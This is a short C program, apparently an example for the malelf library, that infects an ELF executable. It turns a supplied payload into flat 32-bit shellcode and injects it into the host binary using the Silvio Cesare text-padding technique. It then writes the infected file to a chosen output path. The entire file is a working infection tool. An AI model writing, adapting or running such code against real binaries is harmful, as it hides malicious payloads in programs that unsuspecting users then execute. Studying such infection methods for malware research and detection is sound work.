#include <stdio.h>

#include <malelf/binary.h>
#include <malelf/error.h>
#include <malelf/infect.h>

int main(int argc, char **argv)
{
        MalelfBinary input, output, malware, malware_in;
        unsigned long int magic_bytes = 0;
        _u32 error;

        if (argc < 4) {
                fprintf(stderr, "usage: %s <input> <output> <malware>\n",
                        *argv);
                return 0;
        }

        malelf_binary_init(&input);
        malelf_binary_init(&output);
        malelf_binary_init(&malware);
        malelf_binary_init(&malware_in);

        error = malelf_binary_open(&input, argv[1]);
        if (MALELF_SUCCESS != error) {
                MALELF_PERROR(error);
                return 1;
        }

/*        error = malelf_binary_open(&output, argv[2]);
        if (MALELF_SUCCESS != error) {
                MALELF_PERROR(error);
                return 1;
                }*/

        malware.class = MALELF_FLAT32;
        malware_in.class = MALELF_FLAT32;
        error = malelf_binary_open(&malware_in, argv[3]);
        if (MALELF_SUCCESS != error) {
                MALELF_PERROR(error);
                return 1;
        }

        malware.fname = "/tmp/malware.bin";

        _u32 magic_offset = 0;
        error = malelf_shellcode_create_flat(&malware,
                                             &malware_in,
                                             &magic_offset,
                                             0,
                                             0);

        if (MALELF_SUCCESS != error) {
                MALELF_PERROR(error);
                return 1;
        }

        output.fname = argv[2];

        error = malelf_infect_silvio_padding32_new(&input,
                                                   &output,
                                                   &malware,
                                                   0,
                                                   magic_bytes);

        if (MALELF_SUCCESS != error) {
                MALELF_PERROR(error);
                return 1;
        }

        error = malelf_binary_write(&output, output.fname, 1);

        if (MALELF_SUCCESS != error) {
                MALELF_PERROR(error);
                return 1;
        }

        return 0;
}
